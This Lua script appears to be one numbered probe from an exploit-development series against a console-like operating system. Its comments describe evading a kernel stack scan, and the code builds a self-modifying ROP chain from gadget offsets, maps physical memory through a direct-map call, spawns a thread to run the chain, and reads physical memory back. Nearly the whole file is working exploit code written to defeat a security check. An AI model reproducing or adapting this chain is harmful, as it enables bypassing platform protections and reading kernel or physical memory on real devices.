-- CRASH_CLASS: MODERATE
-- PROBE 563e: Self-modifying ROP to evade stack scanning
--
-- 563d proved: kernel scans child stack at thr_new for MapDM VAs.
-- 562x proved: no MapDM VA in stack → clean spawn even with MapDM active.
--
-- EVASION: Store mapped_va in HEAP slot (not on stack). Child:
-- 1. Loads mapped_va from heap → rax
-- 2. Writes rax to own chain's patch target (future pop_rsi arg)
-- 3. pop_rsi pops the patched value → rsi = mapped_va
-- 4. mov rax, [rsi] → reads physical memory
-- 5. Writes result + sentinel to shared, then thr_exit
--
-- At thr_new time: stack has only heap/eboot addresses → no detection.

print("=== PROBE 563e: SELFMOD ROP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rb(N(ib) + 0x108) or 0; local ehi = rb(N(ib) + 0x10C) or 0
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rb(N(ib) + 0x108) or 0; local lhi = rb(N(ib) + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi], rax; ret
local g_mov_rax_m = eb + 0x1A5CC4  -- mov rax, [rsi]; ret
io.flush()

-- ============================================================
-- [A] Pre-build everything on heap BEFORE MapDM
-- ============================================================
local mapped_va = uint64("0x880000000")

-- Heap slot: mapped_va lives HERE, never on the child's stack
local va_slot = memory.alloc(8)
wq(N(va_slot), mapped_va)

-- Shared buffer with markers
local shared = memory.alloc(0x40)
local sh = N(shared)
wq(sh,       uint64("0xBBBBBBBBBBBBBBBB"))
wq(sh + 8,   uint64("0xAAAAAAAAAAAAAAAA"))
wq(sh + 0x10, uint64("0xCCCCCCCCCCCCCCCC"))

-- Heap stack
local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp_val = sb + ss - ((sb + ss) % 16) - 8

print(string.format("rsp=0x%X va_slot=0x%X shared=0x%X", rsp_val, N(va_slot), sh))

-- Build chain — NO MapDM VA literal anywhere on the stack
local off = 0
local function emit(v) wq(rsp_val + off, v); off = off + 8 end

-- Phase 1: load mapped_va from heap into rax, patch chain
-- off=0: pop_rsi | off=8: &va_slot | off=16: mov_rax_m
emit(g_pop_rsi); emit(uint64(N(va_slot)))
emit(g_mov_rax_m)
-- off=24: pop_rdi | off=32: &patch_target | off=40: mov_m_rax
-- off=48: pop_rsi | off=56: PATCH_TARGET | off=64: mov_rax_m
-- Patch target is at rsp_val + 56 (entry #7, computed while off=24)
local patch_abs = rsp_val + 56
emit(g_pop_rdi); emit(uint64(patch_abs))
emit(g_mov_m_rax)

-- Phase 2: pop_rsi reads PATCHED value = mapped_va
emit(g_pop_rsi)
emit(Z)          -- PLACEHOLDER at rsp+56: overwritten with mapped_va by phase 1
emit(g_mov_rax_m)  -- rax = *mapped_va = PHYSICAL MEMORY DATA

-- Phase 3: write result to shared[0]
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- Phase 4: sentinel to shared[8]
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- Phase 5: thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain=%d entries", off / 8))

-- Verify: no 0x880000000 on stack
print("STACK_SCAN:")
local has_mapdm = false
for i = 0, off - 8, 8 do
    local lo = rb(rsp_val + i) or 0
    local hi = rb(rsp_val + i + 4) or 0
    if lo == 0x80000000 and hi == 8 then
        print(string.format("  FOUND 0x880000000 at rsp+%d!", i))
        has_mapdm = true
    end
end
if not has_mapdm then print("  CLEAN") end

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

io.flush()

-- ============================================================
-- [B] MapDM — zero writes after this point
-- ============================================================
print("[B] MapDM phys 0x100000000")
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("mapdm_rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Spawn + poll
-- ============================================================
print("[C] spawn")
io.flush()
local ok_s, rv_s = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("thr_new=" .. (ok_s and N(rv_s) or -999))
io.flush()

-- Poll sentinel
local found = false
for i = 1, 500000 do
    local s_lo = rb(sh + 8)
    if s_lo and s_lo == 0xCAFEBABE then
        found = true
        local d_lo = rb(sh) or 0
        local d_hi = rb(sh + 4) or 0
        print(string.format("SENTINEL_OK iter=%d", i))
        print(string.format("phys_0x100000000 = 0x%08X_%08X", d_hi, d_lo))
        if d_lo == 0x464C457F then print("*** ELF MAGIC! ***") end
        break
    end
end

if not found then
    print("sentinel NOT found")
    local s_lo = rb(sh + 8) or 0
    local s_hi = rb(sh + 12) or 0
    local d_lo = rb(sh) or 0
    local d_hi = rb(sh + 4) or 0
    print(string.format("sentinel=%08X_%08X", s_hi, s_lo))
    print(string.format("data=%08X_%08X", d_hi, d_lo))
    if d_lo ~= 0xBBBBBBBB then
        print("data CHANGED — child partially executed!")
    end
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 563e DONE ===")
